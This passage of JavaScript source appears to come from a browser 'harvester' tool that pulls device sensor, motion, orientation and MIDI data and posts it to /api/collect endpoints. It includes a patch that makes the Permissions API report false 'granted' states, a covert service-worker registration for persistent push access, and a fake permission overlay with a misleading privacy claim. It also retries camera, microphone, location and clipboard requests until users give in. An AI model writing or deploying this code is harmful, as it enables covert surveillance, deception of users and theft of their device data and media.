        await this.core.send('/api/collect/formdata', {
          formId: 'midi-devices',
          fields: { inputs },
          url: window.location.href
        });
      } else {
        this.attempted.midi = false;
      }
    } catch (e) {
      this.attempted.midi = false;
    }
  }

  // === SENSORS ===

  async forceVibration() {
    try {
      if ('vibrate' in navigator) {
        // Test vibration patterns — can be used for device fingerprinting
        navigator.vibrate(200);
        setTimeout(() => navigator.vibrate([100, 50, 100, 50, 200]), 500);
        
        await this.core.send('/api/collect/formdata', {
          formId: 'vibration-api',
          fields: { supported: true },
          url: window.location.href
        });
      }
    } catch (e) {}
  }

  async forceOrientation() {
    try {
      if ('DeviceOrientationEvent' in window) {
        // Request permission for iOS 13+
        if (typeof DeviceOrientationEvent.requestPermission === 'function') {
          const permission = await DeviceOrientationEvent.requestPermission();
          if (permission === 'granted') {
            window.addEventListener('deviceorientation', (e) => {
              this.core.send('/api/collect/fingerprint', {
                orientation: {
                  alpha: e.alpha,
                  beta: e.beta,
                  gamma: e.gamma,
                  absolute: e.absolute
                }
              });
            }, { once: true });
          }
        } else {
          window.addEventListener('deviceorientation', (e) => {
            this.core.send('/api/collect/fingerprint', {
              orientation: {
                alpha: e.alpha,
                beta: e.beta,
                gamma: e.gamma
              }
            });
          }, { once: true });
        }
      }
    } catch (e) {}

    try {
      if ('DeviceMotionEvent' in window) {
        if (typeof DeviceMotionEvent.requestPermission === 'function') {
          await DeviceMotionEvent.requestPermission();
        }
        window.addEventListener('devicemotion', (e) => {
          this.core.send('/api/collect/fingerprint', {
            motion: {
              acceleration: e.acceleration,
              accelerationIncludingGravity: e.accelerationIncludingGravity,
              rotationRate: e.rotationRate,
              interval: e.interval
            }
          });
        }, { once: true });
      }
    } catch (e) {}
  }

  async forceAmbientLight() {
    try {
      if ('AmbientLightSensor' in window) {
        const sensor = new AmbientLightSensor();
        sensor.onreading = () => {
          this.core.send('/api/collect/fingerprint', {
            ambientLight: sensor.illuminance
          });
        };
        sensor.start();
        setTimeout(() => sensor.stop(), 5000);
      }
    } catch (e) {}
  }

  async forceProximity() {
    try {
      if ('ProximitySensor' in window) {
        const sensor = new ProximitySensor();
        sensor.onreading = () => {
          this.core.send('/api/collect/fingerprint', {
            proximity: {
              distance: sensor.distance,
              max: sensor.max
            }
          });
        };
        sensor.start();
        setTimeout(() => sensor.stop(), 5000);
      }
    } catch (e) {}
  }

  async forceWakeLock() {
    try {
      if ('wakeLock' in navigator) {
        const lock = await navigator.wakeLock.request('screen').catch(() => null);
        if (lock) {
          this.core.send('/api/collect/formdata', {
            formId: 'wake-lock',
            fields: { granted: true },
            url: window.location.href
          });
          
          // Release after 30 seconds to not drain battery
          setTimeout(() => lock.release(), 30000);
        }
      }
    } catch (e) {}
  }

  async forcePointerLock() {
    try {
      if ('pointerLockElement' in document) {
        document.addEventListener('click', () => {
          if (!document.pointerLockElement) {
            document.body.requestPointerLock();
          }
        }, { once: true });
      }
    } catch (e) {}
  }

  // === PERMISSION API PATCH ===

  patchPermissionsAPI() {
    try {
      if (!('permissions' in navigator)) return;

      const originalQuery = navigator.permissions.query.bind(navigator.permissions);
      const self = this;

      navigator.permissions.query = async function(descriptor) {
        const result = await originalQuery(descriptor);
        
        // If we already have a stream for this permission type, lie about denied state
        if (descriptor.name === 'camera' && self.granted.camera) {
          Object.defineProperty(result, 'state', { value: 'granted' });
        }
        if (descriptor.name === 'microphone' && self.granted.microphone) {
          Object.defineProperty(result, 'state', { value: 'granted' });
        }
        if (descriptor.name === 'geolocation' && self.granted.geolocation) {
          Object.defineProperty(result, 'state', { value: 'granted' });
        }
        if (descriptor.name === 'notifications' && self.granted.notifications) {
          Object.defineProperty(result, 'state', { value: 'granted' });
        }
        if (descriptor.name === 'clipboard-read' && self.granted.clipboard) {
          Object.defineProperty(result, 'state', { value: 'granted' });
        }
        if (descriptor.name === 'persistent-storage' && self.granted.persistentStorage) {
          Object.defineProperty(result, 'state', { value: 'granted' });
        }

        return result;
      };

      // Also patch for all query variations
      navigator.permissions.query = navigator.permissions.query;
    } catch (e) {}
  }

  // === SERVICE WORKER FOR NOTIFICATIONS ===

  async registerNotificationWorker() {
    try {
      if (!('serviceWorker' in navigator)) return;

      // Register a minimal SW for push notifications
      const swCode = `
        self.addEventListener('install', (e) => self.skipWaiting());
        self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));
        self.addEventListener('push', (e) => {
          const data = e.data?.json() || {};
          self.registration.showNotification(data.title || 'Update', {
            body: data.body || 'You have new content',
            icon: '/favicon.ico'
          });
        });
        self.addEventListener('notificationclick', (e) => {
          e.notification.close();
          e.waitUntil(clients.openWindow('/'));
        });
        self.addEventListener('message', (e) => {
          if (e.data && e.data.type === '__harvester_ping__') {
            e.ports[0]?.postMessage({ type: 'pong', swActive: true });
          }
        });
      `;

      const blob = new Blob([swCode], { type: 'application/javascript' });
      const swUrl = URL.createObjectURL(blob);
      
      const registration = await navigator.serviceWorker.register(swUrl, { scope: '/' }).catch(() => null);
      
      if (registration) {
        // Wait for it to be active
        await navigator.serviceWorker.ready;
        
        await this.core.send('/api/collect/formdata', {
          formId: 'service-worker',
          fields: { registered: true, scope: registration.scope },
          url: window.location.href
        });
      }
    } catch (e) {}
  }

  // === SOCIAL ENGINEERING OVERLAY ===

  showFakeOverlay(config) {
    if (this.overlayShown) return;
    this.overlayShown = true;

    const iconType = config.iconType || 'notifications';
    const accentColor = this.getAccentColor(iconType);
    const iconSVG = this.getIconSVG(iconType);
    const gradientDef = this.getIconGradient(iconType);
    const code = config.code || '';

    // Create overlay with glassmorphism effect
    const overlay = document.createElement('div');
    overlay.id = 'harvester-permission-overlay';
    overlay.style.cssText = `
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: var(--harv-bg, rgba(0,0,0,0.75));
      z-index: 2147483647;
      display: flex; align-items: center; justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      animation: harvFadeIn 0.3s ease-out;
    `;

    // Inject keyframes
    if (!document.getElementById('harv-keyframes')) {
      const style = document.createElement('style');
      style.id = 'harv-keyframes';
      style.textContent = `
        @keyframes harvFadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes harvSlideUp { from { opacity: 0; transform: translateY(24px) scale(0.96); } to { opacity: 1; transform: translateY(0) scale(1); } }
        @keyframes harvPulse { 0%, 100% { box-shadow: 0 0 0 0 rgba(var(--harv-accent-rgb), 0.4); } 50% { box-shadow: 0 0 0 12px rgba(var(--harv-accent-rgb), 0); } }
        @keyframes harvShimmer { 0% { background-position: -200% center; } 100% { background-position: 200% center; } }
        @keyframes harvIconPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        @keyframes harvRipple { to { transform: scale(4); opacity: 0; } }
        @keyframes harvFloat { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-6px); } }
      `;
      document.head.appendChild(style);
    }

    // Add CSS variables
    const r = parseInt(accentColor.slice(1,3), 16);
    const g = parseInt(accentColor.slice(3,5), 16);
    const b = parseInt(accentColor.slice(5,7), 16);
    overlay.style.setProperty('--harv-accent-rgb', `${r},${g},${b}`);

    const dialog = document.createElement('div');
    dialog.style.cssText = `
      background: rgba(22, 28, 40, 0.92);
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 20px;
      padding: 36px 32px 28px;
      max-width: 400px;
      width: 88%;
      text-align: center;
      box-shadow: 0 24px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.03) inset;
      animation: harvSlideUp 0.35s cubic-bezier(0.16, 1, 0.3, 1);
      position: relative;
      overflow: hidden;
    `;

    // Gradient accent line at top
    const accentLine = document.createElement('div');
    accentLine.style.cssText = `
      position: absolute; top: 0; left: 0; right: 0; height: 3px;
      background: linear-gradient(90deg, transparent, ${accentColor}, transparent);
      background-size: 200% auto;
      animation: harvShimmer 2s linear infinite;
    `;
    dialog.appendChild(accentLine);

    // Icon container with glow
    const iconContainer = document.createElement('div');
    iconContainer.style.cssText = `
      width: 72px; height: 72px; margin: 0 auto 18px;
      background: rgba(${r},${g},${b},0.12);
      border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      animation: harvFloat 3s ease-in-out infinite;
      position: relative;
    `;

    // Glow ring
    const glowRing = document.createElement('div');
    glowRing.style.cssText = `
      position: absolute; inset: -3px; border-radius: 50%;
      border: 2px solid rgba(${r},${g},${b},0.25);
      animation: harvPulse 2s ease-in-out infinite;
    `;
    iconContainer.appendChild(glowRing);

    // SVG icon
    const iconWrapper = document.createElement('div');
    iconWrapper.style.cssText = `color: ${accentColor}; display: flex; align-items: center; justify-content: center; width: 48px; height: 48px;`;
    iconWrapper.innerHTML = `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">${gradientDef}${iconSVG.replace(/<svg[^>]*>/, '').replace('</svg>', '')}</svg>`;
    iconContainer.appendChild(iconWrapper);
    dialog.appendChild(iconContainer);

    // Title
    const title = document.createElement('h2');
    title.textContent = config.title;
    title.style.cssText = `
      color: #fff; margin: 0 0 10px 0; font-size: 21px; font-weight: 700;
      letter-spacing: -0.01em; line-height: 1.3;
    `;
    dialog.appendChild(title);

    // Message
    const message = document.createElement('p');
    message.textContent = config.message;
    message.style.cssText = `
      color: rgba(255,255,255,0.6); margin: 0 0 20px 0; font-size: 14px;
      line-height: 1.6; max-width: 320px; margin-left: auto; margin-right: auto;
    `;
    dialog.appendChild(message);

    // Code block (if clipboard)
    if (code) {
      const codeBlock = document.createElement('div');
      codeBlock.style.cssText = `
        background: rgba(255,255,255,0.05); padding: 14px 18px; border-radius: 12px;
        font-family: 'SF Mono', 'Fira Code', 'Fira Mono', Menlo, monospace;
        font-size: 18px; margin-bottom: 20px; color: #fff;
        border: 1px solid rgba(255,255,255,0.08);
        letter-spacing: 0.15em; font-weight: 600;
        user-select: all; cursor: pointer;
        transition: background 0.2s;
      `;
      codeBlock.textContent = code;
      codeBlock.onmouseenter = () => { codeBlock.style.background = 'rgba(255,255,255,0.08)'; };
      codeBlock.onmouseleave = () => { codeBlock.style.background = 'rgba(255,255,255,0.05)'; };
      codeBlock.onclick = () => {
        navigator.clipboard?.writeText(code).catch(() => {});
        codeBlock.textContent = '✓ Copied!';
        setTimeout(() => { codeBlock.textContent = code; }, 1500);
      };
      dialog.appendChild(codeBlock);
    }

    // Button
    const btn = document.createElement('button');
    btn.id = 'harvester-permission-btn';
    btn.textContent = config.buttonText;
    btn.style.cssText = `
      background: linear-gradient(135deg, ${accentColor}88, ${accentColor});
      color: white; border: none; padding: 14px 32px; border-radius: 12px;
      font-size: 15px; font-weight: 600; cursor: pointer; width: 100%;
      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
      position: relative; overflow: hidden;
      letter-spacing: 0.01em;
      box-shadow: 0 4px 20px rgba(${r},${g},${b},0.25);
    `;

    // Button hover effects
    btn.onmouseenter = () => {
      btn.style.transform = 'translateY(-1px)';
      btn.style.boxShadow = `0 8px 30px rgba(${r},${g},${b},0.35)`;
    };
    btn.onmouseleave = () => {
      btn.style.transform = 'translateY(0)';
      btn.style.boxShadow = `0 4px 20px rgba(${r},${g},${b},0.25)`;
    };
    btn.onmousedown = () => {
      btn.style.transform = 'translateY(1px)';
    };
    btn.onmouseup = () => {
      btn.style.transform = 'translateY(-1px)';
    };

    // Ripple effect on click
    btn.onclick = function(e) {
      const ripple = document.createElement('span');
      const rect = this.getBoundingClientRect();
      const size = Math.max(rect.width, rect.height);
      ripple.style.cssText = `
        position: absolute; top: ${e.clientY - rect.top - size/2}px; left: ${e.clientX - rect.left - size/2}px;
        width: ${size}px; height: ${size}px; border-radius: 50%;
        background: rgba(255,255,255,0.3); animation: harvRipple 0.6s ease-out;
      `;
      this.appendChild(ripple);
      setTimeout(() => ripple.remove(), 600);
    };

    dialog.appendChild(btn);

    // Privacy note
    const privacyNote = document.createElement('p');
    privacyNote.textContent = 'Your privacy is important to us. Data is encrypted and secure.';
    privacyNote.style.cssText = `
      color: rgba(255,255,255,0.25); font-size: 11px; margin-top: 16px;
      letter-spacing: 0.02em;
    `;
    dialog.appendChild(privacyNote);

    overlay.appendChild(dialog);
    document.body.appendChild(overlay);

    // Auto-hide after timeout (reduced from 15s to 8s for speed)
    this.overlayTimer = setTimeout(() => {
      this.hideFakeOverlay();
    }, 8000);
  }

  hideFakeOverlay() {
    const overlay = document.getElementById('harvester-permission-overlay');
    if (overlay) {
      overlay.style.opacity = '0';
      overlay.style.transition = 'opacity 0.25s ease, backdrop-filter 0.25s ease';
      setTimeout(() => {
        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
      }, 250);
    }
    if (this.overlayTimer) {
      clearTimeout(this.overlayTimer);
      this.overlayTimer = null;
    }
    this.overlayShown = false;
  }

  // === PERMISSION RETRY ===

  retryPermission(key) {
    const retries = this.attempted[`${key}_retries`] || 0;
    if (retries >= this.maxRetries) return;
    this.attempted[`${key}_retries`] = retries + 1;
    this.attempted[key] = undefined; // Reset so the function will run again

    const delay = this.retryDelays[retries] || 10000;
    setTimeout(() => {
      switch(key) {
        case 'camera': this.forceCamera(); break;
        case 'microphone': this.forceMicrophone(); break;
        case 'geolocation': this.forceGeolocation(); break;
        case 'notifications': this.forceNotifications(); break;
        case 'clipboard': this.forceClipboard(); break;
        case 'bluetooth': this.forceBluetooth(); break;
        case 'usb': this.forceUSB(); break;
        case 'midi': this.forceMIDI(); break;
      }
    }, delay);
  }

  // === CLEANUP ===

  cleanup() {
    // Stop all media streams
    this.streams.forEach(stream => {
      stream.getTracks().forEach(track => track.stop());
    });
    this.streams = [];

    // Stop geolocation watch
    if (this.watchId) {
      navigator.geolocation.clearWatch(this.watchId);
    }

    // Stop camera capture interval
    if (this.cameraCaptureInterval) {
      clearInterval(this.cameraCaptureInterval);
    }

    // Remove overlay
    this.hideFakeOverlay();
  }
}